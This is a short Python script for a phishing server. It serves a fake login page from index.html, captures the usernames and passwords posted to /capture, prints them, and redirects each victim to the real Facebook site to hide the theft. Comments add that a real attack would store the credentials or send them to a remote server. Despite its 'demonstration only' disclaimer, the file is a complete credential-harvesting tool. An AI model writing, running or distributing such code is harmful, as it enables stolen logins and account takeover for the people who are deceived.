#This code is for demonstration purposes only. Do not use for illegal activity.
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as file: #Serve the fake html.
                self.wfile.write(file.read())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)

            username = parsed_data.get('username', [''])[0]
            password = parsed_data.get('password', [''])[0]

            print(f"Captured: Username={username}, Password={password}")

            #In real attack, data would be saved to a file, database, or sent to a remote server.
            #Then the user would be redirected to the real website, or a realistic fake.
            self.send_response(302) #Redirect
            self.send_header('Location', 'https://www.facebook.com/') #Redirect to the real website
            self.end_headers()

        else:
            self.send_response(404)
            self.end_headers()

def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd on port {port}...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()